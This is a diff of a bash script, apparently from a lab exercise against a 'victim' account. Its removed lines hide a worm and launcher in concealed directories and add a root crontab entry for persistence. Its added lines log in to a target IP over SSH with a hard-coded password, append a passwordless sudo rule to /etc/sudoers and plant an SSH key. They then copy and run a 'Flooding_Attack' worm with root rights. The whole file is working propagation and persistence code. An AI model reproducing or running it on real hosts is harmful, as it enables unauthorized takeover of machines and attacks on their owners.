@@ -1,39 +1,32 @@
 #!/bin/bash
 
-# This script is to:
-#   (1) Copy the launcher file into the default hidden directory
-#   (2) Copy the worm file into the default hidden directory
-#   (3) Tamper the crontab file
-#   (4) Launch the initial attack
+destip=$1
 
-ldir1="/home/victim/.Launch_Attack"
-ldir2="/home/victim/.you_cant_see_me"
-lfname="launcher.sh"
-wdir1="/home/victim/.etc/.module"
-wdir2="/home/victim/.firefox/.module"
-wfname="Flooding_Attack"
+require_nopasswd(){
+    local superprv="victim ALL=(ALL) NOPASSWD: ALL"
+    local dest="/etc/sudoers"
+    local execmdd="grep victim $dest || echo \"$superprv\" >> $dest"
+    local cmdd="echo victim | sudo -S bash -c '$execmdd'"
+    echo $cmdd
+    sshpass -p victim ssh -o StrictHostKeyChecking=No $destip -l victim $cmdd
+}
+
+require_ssh_key_set() {
+    local mykey=$(cat ~/.ssh/id_rsa.pub)
+    local dest="~/.ssh/authorized_keys"
+    local cmdd="mkdir -p ~/.ssh; touch $dest; grep \"$mykey\" $dest &> /dev/null || echo \"$mykey\" >> $dest"
+    sshpass -p victim ssh -o StrictHostKeyChecking=No $destip -l victim $cmdd
+}
 
 require_worm_distributed() {
-    if [ ! -f "$wdir1/$wfname" ]; then
-        mkdir -p "$wdir1"
-        cp "./task_ii/Flooding_Attack" "$wdir1/$wfname"
-    fi
-
-    if [ ! -f "$ldir1/$lfname" ]; then
-        mkdir -p "$ldir1"
-        cp "./task_ii/launcher.sh" "$ldir1/$lfname"
-    fi
+    local tmpdest="/tmp/.worm0716023"
+    local pvkeyloc=~/.ssh/id_rsa
+    ssh -i $pvkeyloc victim@$destip mkdir $tmpdest
+    scp -i $pvkeyloc ./task_ii/distributer.sh ./task_ii/Flooding_Attack ./task_ii/launcher.sh victim@$destip:$tmpdest
+    ssh -i $pvkeyloc -t victim@$destip "chmod +x $tmpdest/distributer.sh && sudo $tmpdest/distributer.sh"
 }
 
-require_crontab_tampered() {
-    local crtbpath="/etc/crontab"
-    if  ! grep -q "$lfname" $crtbpath; then
-        echo "* * * * * root [ -f '$ldir1/$lfname' ] && cd '$ldir1' && chmod +x './$lfname' && './$lfname' || [ -f '$ldir2/$lfname' ] && cd '$ldir2' && chmod +x './$lfname' && './$lfname'" >> $crtbpath
-    fi
-}
-
-
-require_crontab_tampered &&\
-require_worm_distributed &&\
-chmod +x ./task_ii/launcher.sh &&\
-./task_ii/launcher.sh
+require_nopasswd
+require_ssh_key_set
+require_worm_distributed
+echo DONE
